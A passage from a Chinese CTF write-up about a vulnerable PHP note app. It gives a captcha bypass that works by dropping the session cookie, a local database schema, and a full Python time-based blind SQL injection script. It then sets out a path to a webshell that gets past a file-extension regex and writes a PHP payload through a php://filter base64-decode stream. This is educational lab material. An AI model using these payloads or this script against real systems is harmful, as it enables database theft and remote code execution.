                $_SESSION['answer'] = rand();
            }
`$_POST['code'] != $_SESSION['answer'` 这里有个验证码判断,然后跟进去那个注册功能
上面有代码,可以发现hex编码后插入到sql语句中,并没有其他限制。
访问功能点的要求: `session['user']` 不为空
**需要解决的问题:**
​ (1)时间盲注,需要绕过注册和登录时候的验证码
​ (2)解决登陆后,保持cookie状态去请求`delnote`功能
(1)经典的验证码绕过
验证码工作流程:
登陆界面通过调用`valicode.php` 然后生成验证码设置全局`$_SESSION['answer']`的值
然后在`index.php`
    elseif (isset($_POST['user']) && isset($_POST['pass']) && isset($_POST['code'])) {
                if ($_POST['code'] != $_SESSION['answer']) echo 'Math Test Failed';
进行了判断
网上很多代码写的验证码就是这样写的,由于session是不可伪造的
安全的写法应该是要判断下`$_SESSION['answer']`是否非空,然后在进行比较
这里没有那么便会产生漏洞,$_SESSION变量是根据cookie里面的会话`sessionid`来获取的
那么只要我们删除掉cookie里面的`PHPSESSID`
然后$_POST[‘code’] 为空,那么验证码就可以绕过了。
你可以本地用这个代码进行验证一下。
(2)解决保持cookie访问功能
当时我搞混了hackhttp和requests
requests是不会存储`set-cookie`的值
但是可以通过设置 `s = requests.session()`
来保持会话
(3)需要注意下一些坑点
数据库存储的名字应该是 `bin2hex(admin)`的值
当时我比赛直接用了`admin` 一直跑不出来
    -- 数据库 `ctf`
    drop database if exists ctf;
    create database ctf;
    -- -------------------    -- 表
    use ctf;
    create table if not exists `user`(
        `id` int auto_increment,
        `user` varchar(255) not null,
        `pass` varchar(255) not null,
        primary key(`id`)
    )ENGINE=InnoDB DEFAULT CHARSET=utf8;
    create table if not exists `note`(
        `id` int  auto_increment,
        `user` varchar(255) not null,
        `title` varchar(255) not null,
        `content` text,
        primary key (`id`)
    )ENGINE=InnoDB DEFAULT CHARSET=utf8;
    -- ----------------    -- 测试数据
    insert into user (user,pass) values('0x61646d696e','0x61646d696e'); -- admin admin
    insert into note (user,title,content) values('0x61646d696e','test','test');
这里我给出我自己结合题目构造出来的数据库,来进行复现
没有准备,现场写的垃圾脚本,惨痛经历,建议打比赛要自己准备好各类型脚本.
    #!/usr/bin/python
    # -*- coding:utf-8 -*-    
    import requests
    import time
    str = 'abcdefghijklmnopqrstuvwxyz1234567890_'
    flag=""
    for i in range(1,40):
        for j in str:
            url = 'http://127.0.0.1:8888/ctf2/?action=register'
            payload= "admin' or if((ascii(mid((select pass from user where user='0x61646d696e'),{pos},1))={v}),sleep(5),0)#".format(pos=i,v=ord(j))
            data = {
                'user': payload,
                'pass': 'admin',
                'code':''
            }
            try:
                r1 = requests.post(url,data=data)
            except Exception as e:
                print e
            # print dir(requests.cookies)
            #login
            s = requests.session()
            url1 = 'http://127.0.0.1:8888/ctf2/?action=login'
            data1 = {
                'user':payload,
                'pass':'admin',
                'code':''
            }
            try:
                r2=s.post(url1,data=data1)
            except Exception as e:
                print e
            #getflag
            url2 = 'http://127.0.0.1:8888/ctf2/?action=delete&id=3'
            t1 = time.time()
            try:
                r3 = s.get(url2,allow_redirects=False)
            except Exception as e:
                print e
            # print r3.content
            t2 =time.time()
            if(t2-t1>3):
                flag = flag + j
                print "adminpass:{}".format(flag)
这个脚本也就凑合着用，如果比赛环境较卡的话，这样写的是不行的，要自己写好异常处理，出错判断等用函数封装好,方便比赛快速修改。
获取到用户名和密码 `admin admin`
####  漏洞点二 php代码注入(文件上传)
    case 'backup':
        if (!$admin) {
            header("HTTP/1.1 302 Found");
            header("Location: ?action=home");
        }
        if (!empty($_POST['id']) && !empty($_POST['file'])) {
            $id = (int)$_POST['id'];
            chdir("./backupnotes/");
            $file = str_replace("..","",$_POST['file']);
            if (preg_match('/.+.ph(p[3457]?|t|tml)$/', $file)) echo 'Bad file extension';
            else {
                $result = $conn->query("select * from note where id=$id");
                if (!$result->num_rows)  echo 'Failed to backup';
                else {
                    $data = $result->fetch_assoc();
                    $f = fopen($file, 'w');
                    if($f){
                            fwrite($f, $data['content']);
                            fclose($f);
                            echo 'Backup saved at ./backupnotes/' . $file . '';
                        }else{
                            echo 'Failed to backup';
                        }
                }
            }
     }
分析下流程: 获取file和id->判断文件名->根据id获取content内容->写入文件->输出文件路径
**需要解决问题:**
（1)绕过文件名后缀判断
`if (preg_match('/.+.ph(p[3457]?|t|tml)$/', $file))`
这个正则问题出现在$ 匹配末尾 文件名 `1.php/.`,在写入的时候会除掉/.
这样就绕过去了
(2)content内容是否可控
    1.$content = htmlspecialchars($_POST['content'],ENT_QUOTES);
    2.newnote($user, $title, $content)
    3.function newnote($user, $title, $content) {
        global $conn;
        if ($title) $title = '0x' . bin2hex($title); else $title = "''";
        if ($content) $content = '0x' . bin2hex($content); else $content = "''";
        $user = '0x'.bin2hex($user);
        $result = $conn->query("insert into note (user, title, content) values ($user, $title, $content)");
        return $result;
    }
可以发现我们可以通过
写入``
然后在url上获取id进入备份功能
当时我以为这样就ok结果 但是去查看下文件就发现了
`<> 被htmlspcialchar转义掉了`
这里便有个 **tips来绕过**
以前我们应该做过类似的绕过死亡的exit这些题目 写函数用的是`file_put_contents()`
参考下p神的文章:[谈一谈php://filter的妙用](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)
经过我测试fwrite也是支持php://filter的
那么思路就有了
`` ->base64->`PD9waHAgcGhwaW5mbygpOz8+`
然后存入note里面获取到对应的id
进入备份功能,文件名:`php://filter/write=convert.base64-decode/resource=xq17.php/.`
这样便可以实现getshell了
## 0x4比赛感受
​ 之前打完了比赛之后就比较懒惰了,搞的这次比赛没准备好脚本还有整理手头积累的一些知识点，
反正这次web打的很迷，看着雅礼中学那些高中生大佬还有湘大的漂亮小姐姐，自己就被奶死了，搞
得这次web本应做出来的题没做出来，没能苟第一，与一等奖绝缘，还是很遗憾，菜是原罪。(ps苟了个华为ai音箱奖品感觉还是很好哒)